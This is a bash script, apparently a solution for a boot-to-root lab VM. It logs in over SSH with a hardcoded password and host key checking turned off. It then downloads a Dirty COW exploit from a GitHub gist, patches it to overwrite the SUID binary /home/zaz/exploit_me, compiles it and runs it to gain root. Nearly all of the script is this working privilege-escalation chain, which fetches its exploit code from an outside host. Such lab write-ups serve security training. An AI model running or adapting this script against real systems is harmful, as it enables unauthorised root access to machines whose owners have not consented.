#!/bin/bash

CURDIR=`dirname "$(readlink -f "$0")"`

USER="zaz"
PASS="646da671ca01bb5d84dbb5fb2238dc8e"
B2R_PORT=22

if [ -z ${B2R_HOST+x} ]; then read -p "VM Host: " B2R_HOST; fi

if dpkg -s sshpass >/dev/null 2>&1; then
    export SSHPASS=$PASS
    SSHP="sshpass -e"
fi

echo -e "$USER password is: $PASS\n"

str_escape() {
	str=$1
	REPLACE="'\"|\\/><&!"
	echo $str | sed -e 's/\\/\\\\/g; s/\//\\\//g; s/&/\\\&/g'
}

cow_injection() {
	# Download exploit
	curl -s https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c > cow.c

	# Replace suid binary
	SUID_DEFAULT='/usr/bin/passwd'
	SUID_BINARY='/home/zaz/exploit_me'
	sed -i "s/`str_escape $SUID_DEFAULT`/`str_escape $SUID_BINARY`/" cow.c

	# Remove x64 payload
	sed -i '/linux\/x64/,/linux\/x86/{//!d}' cow.c

	# Remove lines starting with '/' or '*'
	sed -i '/^[\/\*]/d' cow.c

	# Compile
	gcc -w -pthread cow.c -o cow

	# Run exploit
	echo "[+] Running exploit. Could take a while..."
	./cow

	# Run suid binary with shellcode injection
	$SUID_BINARY <<< id
}

(set -x
	$SSHP \
	ssh -q -o StrictHostKeyChecking=no $USER@$B2R_HOST -p $B2R_PORT 'bash -x' <<- EOI
		$(typeset -f cow_injection)
		$(typeset -f str_escape)

		cow_injection
	EOI
)


# Clean
echo && read -p "Rollback /home/zaz/exploit_me ? [yY] " -n 1 -r
if [[ $REPLY =~ ^[yY]$ ]]; then
    echo
	(set -x
		$SSHP \
		ssh -q -o StrictHostKeyChecking=no $USER@$B2R_HOST -p $B2R_PORT 'bash -x' <<- EOI
			mv /tmp/bak /home/zaz/exploit_me
		EOI
	)
fi
